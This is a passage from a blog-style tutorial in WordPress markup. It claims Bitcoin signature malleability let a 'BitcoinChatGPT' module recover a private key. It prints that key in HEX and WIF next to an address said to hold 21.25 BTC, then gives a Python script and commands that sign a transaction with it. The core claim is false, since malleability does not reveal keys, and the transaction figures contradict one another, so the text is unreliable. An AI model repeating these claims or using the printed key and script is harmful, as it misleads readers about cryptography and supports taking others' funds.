<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://colab.research.google.com/drive/1YGZiPtgY0vPQ3PwUvbAjQW8LcErVHRsT">https://colab.research.google.com/drive/1YGZiPtgY0vPQ3PwUvbAjQW8LcErVHRsT</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>State of a vulnerable transaction in Bitcoin:

01000000
....01
........0dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935
............00000000
........8b483045
....0221
...........00
...........97255916a3cc4f69d4fa16f68219d0b1798d392fb0dce5fb0a358510df8cabe0
....0220
........1014656120e0a6e7c8c4a79ee22b3cdd4f55435e3e9bf3ab7287ae16858dd9d5
.....0141
.....049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461
....ffffffff
01
....d204000000000000
........1976
............a914
........d77522a2b18e0064aba02ca7f864a5bb22998259
....88ac
00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-16-1024x670.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-16-1024x670.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Let’s combine all the output values ​​into one common string using the Python script&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/combinex.py">combinex.py</a>&nbsp;:</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b48304502210097255916a3cc4f69d4fa16f68219d0b1798d392fb0dce5fb0a358510df8cabe002201014656120e0a6e7c8c4a79ee22b3cdd4f55435e3e9bf3ab7287ae16858dd9d50141049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461ffffffff01d2040000000000001976a914d77522a2b18e0064aba02ca7f864a5bb2299825988ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Let’s open the BlockCypher option&nbsp;</strong><strong><a href="https://live.blockcypher.com/btc/decodetx">“Decode A Transaction”</a></strong>&nbsp;:</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><a href="https://live.blockcypher.com/btc/decodetx">https://live.blockcypher.com/btc/decodetx</a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-1-1024x525.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-1-1024x525.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>After decoding the vulnerable Bitcoin Raw transaction we get the result:</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>{
    "addresses": &#91;
        "1QiERrMcv6mtGk4F1TVz4sRp9dFfXTQpK",
        "1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw"
    ],
    "block_height": -1,
    "block_index": -1,
    "confirmations": 0,
    "double_spend": false,
    "fees": 2606688996428,
    "hash": "a5828ec5775b967c36ab5c6a0184aaa52fd64e6650d07287cc7688266c6dbb28",
    "inputs": &#91;
        {
            "addresses": &#91;
                "1QiERrMcv6mtGk4F1TVz4sRp9dFfXTQpK"
            ],
            "age": 344419,
            "output_index": 0,
            "output_value": 2606688997662,</strong>
<strong>            "prev_hash": "35591e5c7f4f1f0e4d81748042f2a4b7dcae3ae01027f361cad7c8746369bc0d",</strong>
<strong>.......
.......
.......</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Pay attention to Bitcoin HASH160:&nbsp;</strong><strong>d77522a2b18e0064aba02ca7f864a5bb22998259</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-9.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-9.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/dfc7da9a6b41d72253bfcb6ae6da2718de7d9b87/36SignatureMalleability/DecodeRawTX.txt#L31">https://github.com/demining/CryptoDeepTools/blob/dfc7da9a6b41d72253bfcb6ae6da2718de7d9b87/36SignatureMalleability/DecodeRawTX.txt#L31</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://coinbin.ru/#verify">Transaction Script</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#transaction-script"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 class="wp-block-heading">The above script has been decoded</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#the-above-script-has-been-decoded"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>BitcoinChatGPT</strong>&nbsp;creates a transaction structure using&nbsp;<code><strong>HASH</strong></code>the public key, where we see that Bitcoin address:&nbsp;<strong><a href="https://btc1.trezor.io/address/1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw">1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw</a></strong>&nbsp;sends&nbsp;<strong><code>1234 satoshi</code></strong>to the same address within its network.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-2-1024x377.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-2-1024x377.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Bitcoin HASH160 was generated using Python Script:&nbsp;<a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/wif_to_hash160.py"><strong>wif_to_hash160.py</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a target="_blank" rel="noreferrer noopener" href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-3.png"></a><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/DecodeRawTX.txt#L31"><strong>d77522a2b18e0064aba02ca7f864a5bb22998259</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-4-1024x619.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-4-1024x619.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/wif_to_hash160.py">https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/wif_to_hash160.py</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Question – Answer:</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-5-1024x539.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-5-1024x539.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-6-1024x584.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-6-1024x584.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-7-1024x606.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-7-1024x606.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>Finally, the&nbsp;<strong><a href="https://github.com/BitcoinChatGPT/Signature-Malleability-Vulnerability-Algorithm/blob/main/BitcoinChatGPT_%E2%84%965_Signature_Malleability_Vulnerability_Algorithm.ipynb">BitcoinChatGPT</a></strong>&nbsp;module outputs the response to the file:&nbsp;<strong><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/KEYFOUND.privkey">KEYFOUND.privkey</a></strong>&nbsp;storing the private key in two most used formats&nbsp;<strong>HEX &amp; WIF</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-8-1024x669.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-8-1024x669.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/KEYFOUND.privkey">https://github.com/demining/CryptoDeepTools/blob/main/36SignatureMalleability/KEYFOUND.privkey</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>============================= KEYFOUND.privkey =============================

Private Key HEX: 0x17e96966f15a56993e13f8c19ce34a99111ad768a051d9febc24b6d48cae1951

Private Key WIF: 5HzpNjEsxrpxPFqBKaoRSnFeq7RP57mvzwgoQFVtAJNZBpLVyur

Bitcoin Address: 1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw

Balance: 21.25292140 BTC

============================= KEYFOUND.privkey =============================</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://youtu.be/nWU2c2haVoA">BitcoinChatGPT №5 Signature Malleability Vulnerability Algorithm</a></h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#bitcoinchatgpt-5-signature-malleability-vulnerability-algorithm"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.youtube.com/watch?v=nWU2c2haVoA"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-3(1).png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Vulnerable Raw Transaction</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#vulnerable-raw-transaction"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Let’s create a vulnerable Raw transaction from the received data using the&nbsp;&nbsp;<strong><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction">Broadcast Bitcoin Transaction repository</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Download and install the source code, open the terminal and run the command:</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>git clone https://github.com/smartibase/Broadcast-Bitcoin-Transaction.git
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Catalog:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>cd Broadcast-Bitcoin-Transaction</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Let’s install three important libraries:</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><a href="https://pypi.org/project/zmq/"><strong>zmq</strong></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://pypi.org/project/urllib3/"><strong>urllib3</strong></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://pypi.org/project/requests/"><strong>requests</strong></a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-8-1024x495.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-8-1024x495.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/blob/main/requirements.txt"><strong>requirements.txt</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Let’s run the command:</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>pip install -r requirements.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>Let’s open the main file in&nbsp;<a href="https://keyhunters.ru/the-benefits-of-the-popular-notepad-program/">Notepad&nbsp;</a><a href="https://keyhunters.ru/the-benefits-of-the-popular-notepad-program/">++</a>&nbsp;and make a small change to the Python Script code:&nbsp;<strong><a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/blob/main/main.py">main.py</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>from io import BytesIO
from secp256k1 import *
from sighash import *

pk = PrivateKey.parse("5HzpNjEsxrpxPFqBKaoRSnFeq7RP57mvzwgoQFVtAJNZBpLVyur")
pk.address()
tx = bytes.fromhex("35591e5c7f4f1f0e4d81748042f2a4b7dcae3ae01027f361cad7c8746369bc0d")
index = 0
send = "1LeEbwu667oPtQC5dKiGiysUjFM3mQaxpw"
tx_in = TxIn(tx, index, b'', 0xffffffff)
tx_in._script_pubkey = Tx.get_address_data(pk.address())&#91;'script_pubkey']
tx_in._value = 2345
tx_ins = &#91; tx_in ]
tx_outs = &#91;
    TxOut(1234, Tx.get_address_data(send)&#91;'script_pubkey'].serialize())
]
tx = Tx(1, tx_ins, tx_outs, 0, testnet=True)
signature(tx, 0, pk)
tx.serialize().hex()
print(tx.serialize().hex())
f = open("RawTX.txt", 'w')
f.write("" + tx.serialize().hex() + "" + "\n")
f.close()</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Let’s run the command:</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>python main.py</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://www.youtube.com/watch?v=8B2LKMBsVSE">Vulnerable transaction created&nbsp;</a><a href="https://www.youtube.com/watch?v=8B2LKMBsVSE">!</a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>Let’s open the RawTX file in the directory:</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b48304502210097255916a3cc4f69d4fa16f68219d0b1798d392fb0dce5fb0a358510df8cabe002201014656120e0a6e7c8c4a79ee22b3cdd4f55435e3e9bf3ab7287ae16858dd9d50141049b4069d8237fae8f2417c71c5512ec1b0547b5597474480cc28ea1bbfeecaab8b90fdec161ad6ef4378f274a60b900452431533596bf3bd23e01202ebf679461ffffffff01d2040000000000001976a914d77522a2b18e0064aba02ca7f864a5bb2299825988ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">The order of actions in the video:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#the-order-of-actions-in-the-video"></a></p>
<!-- /wp:paragraph -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://www.youtube.com/watch?v=8B2LKMBsVSE"><img src="https://github.com/demining/Signature-Malleability/raw/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-4.png" alt="Research into Signature Malleability and Private Key Compromise in Bitcoin Signatures"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong><em>It was this vulnerable RawTX that we looked at at the beginning of this article:</em></strong> <a href="https://cryptodeeptool.ru/signature-malleability/#aa553e57-81fe-4c3c-98dd-0d1b60ea55ee-link">↩︎</a></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><a target="_blank" rel="noreferrer noopener" href="https://github.com/demining/Signature-Malleability/blob/main/Research%20into%20Signature%20Malleability%20and%20Private%20Key%20Compromise%20in%20Bitcoin%20Signatures%20-%20CRYPTO%20DEEP%20TECH_files/image-20.png"></a><strong>RawTX</strong>&nbsp;decoding process&nbsp;&nbsp;&nbsp;using tool&nbsp;<a href="https://github.com/smartibase/Broadcast-Bitcoin-Transaction/tree/main/decoderaw"><strong>decoderaw</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em>As we know from&nbsp;<a href="https://keyhunters.ru/what-is-prompt-answers-and-how-is-it-related-to-machine-learning-and-artificial-intelligence/">the prompt responses of the&nbsp;</a><a href="https://colab.research.google.com/drive/1YGZiPtgY0vPQ3PwUvbAjQW8LcErVHRsT"><strong>BitcoinChatGPT</strong></a>&nbsp;module ,&nbsp;the Signature Malleability Vulnerability Algorithm can be used to solve complex cryptographic problems.</em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">Conclusion</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#conclusion"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>There are many methods to detect and prevent counterfeit signatures in the Bitcoin network. These methods range from simple solutions such as increasing the number of confirmations to more complex anomaly analysis systems and regular security protocol updates. Effective protection requires a comprehensive approach to network security and constant monitoring of new threats. Counterfeit signatures can lead to fraudulent transactions and loss of funds. The main methods used to detect and prevent such attacks are:</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. Increasing the number of confirmations</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#1-increasing-the-number-of-confirmations"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>One of the simplest ways to protect against counterfeit signatures is to increase the number of confirmations of a transaction before it is finally accepted. It is recommended to wait for at least six confirmations to reduce the likelihood of a successful attack. This ensures that the transaction was included in the block and cannot be reversed.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. Analysis of blocks and transactions</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#2-analysis-of-blocks-and-transactions"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Mining software and network nodes analyze blocks and transactions for conflicts and anomalies. This includes checking the signature for compliance with the format, as well as checking the values ​​of&nbsp;&nbsp;<em><strong>r</strong></em>&nbsp;&nbsp;and&nbsp;&nbsp;<em><strong>s</strong></em>&nbsp;&nbsp;for acceptable ranges. If the values ​​are outside the acceptable ranges, the transaction may be rejected.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. Implementation of anomaly analysis systems</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#3-implementation-of-anomaly-analysis-systems"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Using anomaly analysis systems can identify suspicious transactions and blockchains. These systems can use machine learning algorithms to detect unusual behavior in the network, which may indicate attempts to forge signatures.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4. Network monitoring software</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#4-network-monitoring-software"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Tools such as&nbsp;<a href="https://keyhunters.ru/sybil-and-eclipse-attacks/">Wireshark</a>&nbsp;can be used to analyze network traffic and identify suspicious activity. Monitoring network traffic can help identify&nbsp;<a href="https://keyhunters.ru/sybil-and-eclipse-attacks/">Sybil</a>&nbsp;or&nbsp;<a href="https://keyhunters.ru/sybil-and-eclipse-attacks/">Eclipse</a>&nbsp;attacks that can be used to manipulate transactions.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">5. Regularly update security protocols</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#5-regularly-update-security-protocols"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Regularly updating software and security protocols helps to eliminate known vulnerabilities, such as the&nbsp;<a href="https://cryptodeeptech.ru/deserialize-signature-vulnerability-bitcoin/"><strong>DeserializeSignature</strong></a>&nbsp;vulnerability , which allows attackers to create invalid signatures. Updates should include fixes for all known vulnerabilities and security improvements.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">6. Multi-level confirmation</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Signature-Malleability/tree/main#6-multi-level-confirmation"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Using multiple levels of transaction confirmation can improve network security. This could include additional checks by nodes or using third-party services to verify signatures.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">References:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
